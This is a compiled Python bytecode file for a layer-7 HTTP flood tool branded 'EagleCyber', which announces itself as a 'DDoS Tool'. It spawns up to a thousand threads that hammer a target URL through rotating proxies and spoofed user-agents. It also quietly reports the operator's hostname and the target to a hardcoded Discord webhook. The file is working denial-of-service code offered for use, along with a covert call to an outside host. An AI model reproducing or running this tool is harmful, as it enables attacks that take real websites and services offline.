o
    �/d�  �                   @   s�   z$d dl Zd dlZd dlZd dlZd dlZd dlZd dlmZ d dl	Z	W n   ej
�d�r4e�d� n	 Y g d�ZG dd� dej�ZG dd	� d	�Zed
krbej
�d�rZe�d� n	 e� ��  dS dS )�    N)�DiscordWebhook�linuxzpip3 install discord_webhook)
zlMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)zRMozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)z<Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00z9Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14zKMozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14z>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14zAOpera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02zBOpera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00zBOpera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00zSMozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )�fuckerc                 C   s<   t j�| � || _|| _dt�t�i| _t �	� | _	|| _
d S )Nz
User-Agent)�	threading�Thread�__init__�url�num�random�choice�
useragents�headers�Lock�proxy)�selfr   �numberr   � r   �s.pyr      s   

zfucker.__init__c                 C   s`   d }t j�d| ji�}t j�|�}t j�|� t j�| j|| j�}t j�	|� t
d| j � d S )N�http�[EagleCyber] Mematuk [%s])�urllib�request�ProxyHandlerr   �build_opener�install_opener�Requestr   r   �urlopen�print)r   �datar   �opener�reqr   r   r   r   "   s   zfucker.requestc                 C   sJ   | j ��  | j ��  	 z| ��  W n   tj�d| j � t�d� Y q)NTr   r   )	r   �acquire�releaser   �sys�stdout�writer   �exit)r   r   r   r   �run+   s   

�z
fucker.runN)�__name__�
__module__�__qualname__r   r   r'   r   r   r   r   r      s    	r   c                   @   s   e Zd Zdd� ZdS )�MainLoopc           
      C   s�   t d� ztjd }t�� }td|� d|� �d�}|�� }W n   Y ztd�}t|d�}W n	   t|d�}Y td�}|d	krEt	d�}nt	|�}zt
|�D ]}|�� }	t||d |	���  |	d d
� }	qNW d S    t d� Y d S )Nu�  
[0m╭━━━┳━━━┳━━━┳╮╱╱╭━━━╮[96m╭━━━┳╮╱╱╭┳━━╮╭━━━┳━━━╮
[0m┃╭━━┫╭━╮┃╭━╮┃┃╱╱┃╭━━╯[96m┃╭━╮┃╰╮╭╯┃╭╮┃┃╭━━┫╭━╮┃
[0m┃╰━━┫┃╱┃┃┃╱╰┫┃╱╱┃╰━━╮[96m┃┃╱╰┻╮╰╯╭┫╰╯╰┫╰━━┫╰━╯┃
[0m┃╭━━┫╰━╯┃┃╭━┫┃╱╭┫╭━━╯[96m┃┃╱╭╮╰╮╭╯┃╭━╮┃╭━━┫╭╮╭╯
[0m┃╰━━┫╭━╮┃╰┻━┃╰━╯┃╰━━╮[96m┃╰━╯┃╱┃┃╱┃╰━╯┃╰━━┫┃┃╰╮
[0m╰━━━┻╯╱╰┻━━━┻━━━┻━━━╯[96m╰━━━╯╱╰╯╱╰━━━┻━━━┻╯╰━╯[0m 
              DDoS Tool Layer7                                        
�   zyhttps://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjImz Has Started Flood To )�urls�contentz	proxy.txt�ri�  � �����z(Usage: python3 ec.py https://example.com)r   r#   �argv�socket�gethostnamer   �execute�str�open�int�range�readliner   �start)
r   r   �hst�webhook�response�
file_proxy�in_file�num_threads�i�in_liner   r   r   �home9   s6   �


�zMainLoop.homeN)r(   r)   r*   rD   r   r   r   r   r+   7   s    r+   �__main__�clear)�urllib.requestr   �osr   �timer
   r#   �discord_webhookr   r3   �platform�
startswith�systemr   r   r   r+   r(   rD   r   r   r   r   �<module>   s$    0�'�